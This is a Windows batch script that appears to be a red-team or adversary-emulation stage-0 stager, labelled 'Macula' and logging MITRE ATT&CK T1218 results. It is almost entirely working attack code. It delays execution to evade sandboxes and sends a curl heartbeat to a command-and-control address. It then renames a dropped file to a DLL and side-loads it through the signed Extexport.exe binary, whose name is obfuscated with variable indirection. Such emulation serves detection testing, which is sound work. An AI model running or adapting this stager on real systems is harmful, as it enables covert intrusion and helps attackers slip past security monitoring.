@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants
SET ubnrmy=%APPDATA%\8832\0d2bbd11
SET qtwrm=Macula-Stage0-8832
SET mbdqu=https://10.0.0.49
SET wqkqg=https://10.0.0.49/stage/2/icon.png?8832-10
SET qotgx=BALAM-S2BO
SET fqpwu=10
SET dxwyvq=control.txt
SET gtwn=8832

REM Setup log file
SET zmdjlr=%APPDATA%\!fqpwu!\macula-simulations.log

echo [%DATE% %TIME%][DEBUG][!qotgx!]: script_start>> "!zmdjlr!" 2>nul

REM Initial sandbox evasion delay
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!qotgx!]: initial_delay_complete>> "!zmdjlr!" 2>nul

REM C2 heartbeat - NOT obfuscated
curl -k -s -o nul "!wqkqg!"
echo [%DATE% %TIME%][DEBUG][!qotgx!]: heartbeat_sent>> "!zmdjlr!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Setup for T1218 execution with indirection obfuscation
SET bhuop=Extexport
SET ghfky=.exe
SET lmopx=foo
SET pgrbq=bar
SET tuewn=bhuop
SET vkxnm=ghfky
SET wxyzb=tuewn
SET yzkml=vkxnm

IF NOT EXIST "!ubnrmy!" mkdir "!ubnrmy!"
echo [%DATE% %TIME%][DEBUG][!qotgx!]: directory_created=!ubnrmy!>> "!zmdjlr!" 2>nul

CHOICE /C Y /N /D Y /T 7 >nul

REM DLL rename operation
IF EXIST "!ubnrmy!\!dxwyvq!" (
    REN "!ubnrmy!\!dxwyvq!" mozcrt19.dll
    echo [%DATE% %TIME%][DEBUG][!qotgx!]: file_renamed=!dxwyvq!>> "!zmdjlr!" 2>nul
)

REM Variable indirection for LOLBIN execution
CALL SET exe_bin=%%!wxyzb!%%
CALL SET exe_ext=%%!yzkml!%%
SET final_exe=!exe_bin!!exe_ext!

REM Random delay
SET /A random_delay=%RANDOM% %% 15 + 10
timeout /t %random_delay% /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!qotgx!]: random_delay_complete=%random_delay%>> "!zmdjlr!" 2>nul

REM Execute with obfuscated command
SET result=1
SET err_detail=
"!final_exe!" "!ubnrmy!" !lmopx! !pgrbq!
IF !ERRORLEVEL! NEQ 0 (
    SET result=0
    SET err_detail=execution_failed
)
echo [%DATE% %TIME%][DEBUG][!qotgx!]: extexport_executed=!ERRORLEVEL!>> "!zmdjlr!" 2>nul

REM T1218 logging with formatted timestamp
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET log_timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!log_timestamp!][!qotgx!]: !fqpwu!-!gtwn!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!zmdjlr!" 2>nul

ping -n 5 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!qotgx!]: script_complete>> "!zmdjlr!" 2>nul